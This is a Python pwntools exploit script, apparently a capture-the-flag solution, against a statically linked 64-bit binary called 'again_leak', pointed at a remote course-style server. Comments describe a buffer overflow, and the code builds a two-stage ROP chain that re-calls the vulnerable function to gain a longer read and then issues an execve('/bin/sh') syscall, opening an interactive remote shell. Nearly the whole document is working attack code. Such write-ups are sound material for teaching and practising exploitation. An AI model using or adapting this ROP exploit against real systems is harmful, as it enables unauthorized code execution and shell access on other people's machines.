from pwn import *

def main():
  # trfghy  = 0x40106e
  # poprdi  = 0x4016d3
  # poprsx  = 0x4374a9
  # poprax  = 0x46b6b8
  # syscall = 0x45b775
  # binsh   = 0x493821

  trfghy  = 0x4009ae
  # poprdi  = 0x4001cc
  poprdi = 0x401536
  # poprdi = 0x40215a
  # poprdi = 0x48b52a
  poprsx  = 0x441fa9
  poprax  = 0x409a54
  syscall = 0x466955
  binsh   = 0x4a0801
  # The binary is 64-bit and statically linked with NX and ASLR.
  # We have an obvious buffer overflow in the `trfghy` function.

  # We only have 24 bytes to play with at first, but we can get
  # more by calling trfghy again, with a larger argument.
  # Arguments are passed using a pop rdi gadget.

  # Once we re-call `trfghy`, we can build a ROP chain to make
  # an execve syscall.
  # 59 --> rax (syscall number)
  # /bin/sh --> rdi (argument #1)
  # NULL --> rsi (argument #2)
  # NULL --> rdx (argument #3)

  # because the `read` function will read in newlines as well
  # it's easiest to combine the two rop chains as one long
  # rop chain

  p = process('./again_leak')
  # p = remote("localhost", 31337)
  p = remote("lox.xvm.mit.edu", 24001)
  # gdb.attach(p, """
                # b trfghy
                # """)

  print p.recvuntil("144")
  # rop1 makes the trfghy(1000) call
  rop1 = "A" * 120 + p64(poprdi) + p64(1000) + p64(trfghy)

  # rop2 calls execve("/bin/sh", 0, 0)
  rop2 = "A" * 120 + p64(poprdi) + p64(binsh) \
                   + p64(poprsx) + p64(0) * 2 \
                   + p64(poprax) + p64(59)    \
                   + p64(syscall)

  p.sendline(rop1 + rop2)
  print p.recvuntil("1000")
  p.interactive()

if __name__ == '__main__':
  main()
